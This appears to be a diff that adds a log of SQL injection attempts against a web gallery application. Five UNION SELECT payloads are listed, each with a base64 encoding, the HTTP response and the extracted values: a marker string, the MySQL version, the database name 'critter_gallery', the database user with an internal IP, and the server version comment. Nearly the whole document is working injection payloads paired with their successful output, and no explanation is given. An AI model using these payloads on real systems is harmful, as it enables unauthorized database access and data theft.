@@ -1,0 +1,25 @@
+RAW  : "' UNION SELECT 'MARK123'-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgJ01BUksxMjMnLS0gLQ==
+HTTP : 200 LEN=4052
+DET  : art='🖼️' h2='&#039; UNION SELECT &#039;MARK123&#039;-- -' desc='MARK123<br>'
+------------------------------------------------------------------------
+RAW  : "' UNION SELECT version()-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgdmVyc2lvbigpLS0gLQ==
+HTTP : 200 LEN=4041
+DET  : art='🖼️' h2='&#039; UNION SELECT version()-- -' desc='8.0.46<br>'
+------------------------------------------------------------------------
+RAW  : "' UNION SELECT database()-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgZGF0YWJhc2UoKS0tIC0=
+HTTP : 200 LEN=4051
+DET  : art='🖼️' h2='&#039; UNION SELECT database()-- -' desc='critter_gallery<br>'
+------------------------------------------------------------------------
+RAW  : "' UNION SELECT user()-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgdXNlcigpLS0gLQ==
+HTTP : 200 LEN=4052
+DET  : art='🖼️' h2='&#039; UNION SELECT user()-- -' desc='gallery@10.18.53.240<br>'
+------------------------------------------------------------------------
+RAW  : "' UNION SELECT @@version_comment-- -"
+B64  : JyBVTklPTiBTRUxFQ1QgQEB2ZXJzaW9uX2NvbW1lbnQtLSAt
+HTTP : 200 LEN=4071
+DET  : art='🖼️' h2='&#039; UNION SELECT @@version_comment-- -' desc='MySQL Community Server - GPL<br>'
+------------------------------------------------------------------------
